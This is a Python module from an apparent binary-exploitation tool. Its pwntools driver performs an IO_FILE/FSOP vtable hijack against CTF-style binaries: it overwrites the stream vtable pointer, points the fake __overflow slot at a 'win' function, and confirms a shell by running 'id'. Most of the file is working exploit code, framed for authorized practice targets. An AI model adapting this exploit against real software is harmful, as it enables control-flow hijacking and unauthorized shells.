"""IO_FILE / FSOP (File-Stream-Oriented Programming), verified by execution.

FSOP hijacks a `_IO_FILE`'s VTABLE: glibc reaches a stream operation (classically on exit,
`_IO_flush_all_lockp` walks `_IO_list_all` and calls `fp->vtable->__overflow(fp, EOF)`, the pointer
at vtable+0x18). Overwriting `fp->vtable` to a fake vtable whose `__overflow` slot points at attacker
code turns the flush into a controlled call. Modern glibc added vtable bounds-checking
(`_IO_vtable_check`), which is why real FSOP now pivots through `_IO_wfile_*`/`_IO_cookie` vtables;
binoracle verifies the vtable-hijack technique against a target whose stream flush reproduces the
`vtable[__overflow](fp)` call, and degrades honestly otherwise. The sandbox runs with ASLR off and
`fp`/`fake_vtable`/`win` are fixed symbols. For AUTHORIZED / CTF targets."""
from __future__ import annotations

from ._sandbox import run_driver

_DRIVER = r'''
import sys, time
from pwn import ELF, context, p64, process
name = sys.argv[1]
context.binary = elf = ELF(name, checksec=False); context.log_level = "error"; context.arch = "amd64"
if elf.bits != 64:
    print("NOT_APPLICABLE (iofile driver is x86-64)"); sys.exit(1)

sym = elf.symbols or {}
fp = sym.get("fp") or sym.get("file")
fake = sym.get("fake_vtable") or sym.get("vtable")
win = sym.get("win")
if fp is None or fake is None or win is None:
    print("NOT_APPLICABLE (no FSOP shape: need fp+fake_vtable+win symbols)"); sys.exit(1)

VTABLE_OFF = 0xd8          # _IO_FILE_plus vtable offset
OVERFLOW_SLOT = 3          # vtable+0x18 == __overflow
MARK = b"BINORACLE_FSOP_PWNED"
io = None
try:
    io = process([name], aslr=False)
    io.recvuntil(b"vt: ")
    io.send(b"A" * VTABLE_OFF + p64(fake))        # fp.vtable = &fake_vtable
    io.recvuntil(b"ov: ")
    io.send(p64(0) * OVERFLOW_SLOT + p64(win) + p64(0) * 4)   # fake_vtable[3] = win
    time.sleep(0.2)
    io.sendline(b"echo " + MARK + b"; id"); time.sleep(0.35)
    out = b""
    try: out = io.recvrepeat(1.1)
    except Exception: pass
    io.close()
    if (MARK in out) or (b"uid=" in out):
        print("VERIFIED fp=%#x fake_vtable=%#x win=%#x" % (fp, fake, win)); sys.exit(0)
except Exception as e:
    try:
        if io: io.close()
    except Exception: pass
    print("ERROR %s" % e.__class__.__name__); sys.exit(1)
print("NOT_VERIFIED")
sys.exit(1)
'''


def autoiofile(binary: str) -> dict:
    """IO_FILE/FSOP verificado por ejecucion (contra un flujo cuya operacion reproduce la llamada
    vtable[__overflow](fp)). Necesita la forma de practica (fp/fake_vtable/win). Docker o sandbox
    nativo (ASLR off); degrada limpio."""
    res = run_driver(binary, _DRIVER, ".binoracle_fsop.py")
    if not res.get("ok"):
        return res
    eng = res.get("engine", "sandbox")
    res["note"] = (f"IO_FILE/FSOP (vtable de _IO_FILE reapuntada -> __overflow llama a win): shell "
                   f"verificada por ejecucion ({eng})"
                   if res.get("verified")
                   else f"IO_FILE/FSOP: no verificado ({eng}) (sin la forma de practica o timing)")
    return res


def render_iofile(r: dict) -> str:
    out = ["## Auto IO_FILE / FSOP (vtable hijack de _IO_FILE, verificado)\n"]
    if not r.get("ok"):
        return "\n".join(out + ["No disponible: " + r.get("note", "")])
    out.append(f"- shell verificada en sandbox: **{'SI' if r.get('verified') else 'no'}**")
    if r.get("detail"):
        out.append(f"- `{r['detail']}`")
    out.append("- " + r.get("note", ""))
    out.append("\n_nota: glibc moderno chequea la vtable (_IO_vtable_check), por eso el FSOP real "
               "pivota por vtables _IO_wfile_*/_IO_cookie; la verificacion reproduce la llamada "
               "vtable[__overflow](fp)._")
    if r.get("output"):
        out.append("\n### salida\n```\n" + r["output"].strip() + "\n```")
    return "\n".join(out)
